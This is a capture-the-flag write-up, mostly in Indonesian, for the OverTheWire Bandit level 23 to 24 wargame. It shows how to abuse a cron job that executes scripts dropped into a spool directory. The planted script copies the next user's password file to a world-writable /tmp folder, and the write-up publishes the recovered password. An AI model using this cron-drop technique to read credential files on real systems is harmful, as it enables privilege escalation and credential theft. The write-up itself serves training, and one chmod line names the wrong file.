# Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

# Solusi
kita telusuri seperti level sebelumnya didapatkan isi shell script
```
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
intinya shell tersebut mengekskusi dan menghapus script yang ada di direktori ***/var/spool/bandit24*** \
untuk itu kita buat direktori baru di ***tmp*** dan membuat shell script di ***/var/spool/bandit24***\
yang mana untuk copy password pada ***/etc/bandit_pass/bandit24*** ke direktori ***tmp*** \
kita buat direktori dan atur permissions menjadi r/w
```
bandit23@bandit:/var/spool/bandit24$ mkdir /tmp/sol24
bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/sol24
```
script seperti ini
```
bandit23@bandit:/var/spool/bandit24$ touch ban24.sh
bandit23@bandit:/var/spool/bandit24$ cat ban24.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/sol24/hasil.txt
bandit23@bandit:/var/spool/bandit24$ chmod +x cat.sh
```

kalo kita coba listing direktori default tidak bisa, harus secara eksplisit
```
bandit23@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
```
kalo kita eksplisit didapatkan
```
bandit23@bandit:/var/spool/bandit24$ ls /tmp/sol24
hasil.txt
```
langsung kita cetak didapatkan password
```
bandit23@bandit:/var/spool/bandit24$ cat /tmp/sol24/hasil.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
<details>
<summary>Password</summary>
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
</details>